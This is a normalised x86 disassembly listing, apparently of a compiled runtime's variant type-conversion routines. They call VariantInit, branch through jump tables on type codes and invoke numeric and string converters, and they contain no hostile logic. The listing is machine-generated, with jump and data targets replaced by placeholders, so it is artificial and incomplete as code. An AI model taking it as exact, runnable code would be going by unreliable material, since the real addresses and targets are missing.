fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411980
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411980
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411864
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411920
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411a7c
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411980
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_4119cc
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40e5e0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411a30
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411980
fistp [ esp ]
fwait
mov eax ebx
call sub_411980
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411c9d ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411980
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411980
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411864
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411920
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411a7c
fistp [ esp ]
fwait
jmp r-xdata
sub_411e48
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404630
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40ea74
pop ebx
pop ebp
retn 0x8
sub_411e80
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404630
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40ea74
pop ebx
pop ebp
retn 0x8
sub_411eb8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_411f6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404630
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40ea74
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411f75
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f74
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4041d8
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407d6c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_40477c
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_4041d8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407d30
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40477c
jmp r-xdata
jmp r-xdata
call sub_40e67c
sub_411f7c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41203b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412019
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40ea74
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404740
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40482c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4041d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412020
lea eax [ ebp - 0x10 ]
call sub_40ee18
retn
sub_412048
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41209e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f140
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412130
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4120a5
lea eax [ ebp - 0x10 ]
call sub_40ee18
retn
sub_4120ac
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_41432c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412121
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403fa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40ee18
retn
sub_412130
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412667
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412169 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403fa4
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403f50
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408080
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403fa4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408080
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403fa4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409520
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403fa4
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409520
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403fa4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_411e48
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4041d8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_411e80
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4041d8
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_404740
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40482c
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4041d8
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_411eb8
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4041d8
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_408080
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403fa4
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408080
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403fa4
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_408080
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403fa4
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_40816c
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403fa4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_40816c
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403fa4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412130
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_411f7c
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403fa4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41266e
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403f74
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_404648
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403f74
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_404648
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f74
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_412048
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403fa4
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403fa4
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e5e0
test ah 0x40
je r-xdata
mov eax esi
call sub_403f50
mov edx eax
mov eax ebx
call sub_4120ac
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_411f7c
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403fa4
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_411f7c
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403fa4
jmp r-xdata
jmp [ eax * 4 + jump_table_4123fd ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408080
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403fa4
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408080
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403fa4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409520
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403fa4
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_409520
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403fa4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_411e48
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4041d8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_411e80
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4041d8
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404178
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_411eb8
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4041d8
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408080
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403fa4
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408080
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403fa4
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408080
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403fa4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_40816c
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403fa4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_40816c
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403fa4
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412130
jmp r-xdata
sub_412674
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41271e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412701
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40ea74
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_404740
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40482c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412708
lea eax [ ebp - 0x10 ]
call sub_40ee18
retn
sub_41272c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412782
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f140
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412858
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412789
lea eax [ ebp - 0x10 ]
call sub_40ee18
retn
sub_412790
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_412848
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_41432c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41284f
lea eax [ ebp - 0x20 ]
call sub_404630
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41282b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_404740
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40482c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40ee18
retn
sub_412858
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412daa
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412892 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40477c
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404630
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408080
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_40477c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408080
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40477c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409520
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40477c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409520
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_40477c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_411e48
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40466c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_411e80
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_40466c
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_404740
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40482c
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_411eb8
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_40466c
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_408080
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_40477c
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408080
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_40477c
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_408080
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_40477c
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_40816c
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_40477c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_40816c
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_40477c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412858
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_412674
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_40466c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412db1
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_404648
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403f74
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_404648
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403f74
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404648
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403f74
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404648
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f74
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_41272c
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_40466c
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40477c
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e5e0
test ah 0x40
je r-xdata
mov eax esi
call sub_404630
mov edx eax
mov eax ebx
call sub_412790
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_412674
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_40466c
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_412674
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_40466c
jmp r-xdata
jmp [ eax * 4 + jump_table_412b19 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408080
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_40477c
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408080
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_40477c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_409520
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_40477c
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409520
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_40477c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_411e48
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_40466c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_411e80
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_40466c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404740
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_411eb8
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_40466c
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408080
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_40477c
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408080
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_40477c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408080
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_40477c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_40816c
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_40477c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_40816c
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_40477c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412858
jmp r-xdata
sub_412db8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412e22
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f140
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_4057d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412e29
lea eax [ ebp - 0x10 ]
call sub_40ee18
retn
mov dx 0xd
mov ax 0x101
call sub_40e5e0
sub_412e30
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_412db8
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4057d4
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4057d4
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_4057bc
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_41432c
test al al
je r-xdata
mov eax esi
call sub_4057bc
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40e5e0
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40e5e0
mov eax esi
call sub_4057bc
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403208
test al al
jne r-xdata
sub_412efc
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_4057bc
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_4057bc
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40e5e0
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4057d4
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4057d4
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_41432c
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40e5e0
mov eax esi
call sub_4057bc
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_403208
test al al
jne r-xdata
sub_412fa8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40ed9c
mov [ edi ] 0x3
movsx eax bl
